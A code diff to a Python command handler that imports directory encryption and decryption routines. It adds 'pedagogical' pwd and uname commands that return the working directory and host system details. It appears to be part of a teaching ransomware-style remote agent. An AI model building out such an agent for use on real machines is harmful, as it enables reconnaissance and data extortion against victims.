@@ -17,6 +17,7 @@ from typing import Dict, Any
 from pathlib import Path
 from system import encrypt_directory, decrypt_directory
 import os
+import platform
 
 
 def handle_command(command: Dict[str, Any], key: str) -> Dict[str, Any]:
@@ -87,6 +88,42 @@ def handle_command(command: Dict[str, Any], key: str) -> Dict[str, Any]:
             }
 
     # ------------------------------------------------------------
-    # 5) Commande inconnue
+    # 5) Commande pédagogique : pwd
+    # ------------------------------------------------------------
+    if ctype == "pwd":
+        try:
+            cwd = os.getcwd()
+            return {
+                "type": "pwd_result",
+                "cwd": cwd
+            }
+        except Exception as e:
+            return {
+                "type": "pwd_result",
+                "error": str(e)
+            }
+
+    # ------------------------------------------------------------
+    # 6) Commande pédagogique : uname
+    # ------------------------------------------------------------
+    if ctype == "uname":
+        try:
+            info = platform.uname()
+            return {
+                "type": "uname_result",
+                "system": info.system,
+                "node": info.node,
+                "release": info.release,
+                "version": info.version,
+                "machine": info.machine
+            }
+        except Exception as e:
+            return {
+                "type": "uname_result",
+                "error": str(e)
+            }
+
+    # ------------------------------------------------------------
+    # 7) Commande inconnue
     # ------------------------------------------------------------
     return {"error": f"Commande inconnue : {ctype}"}
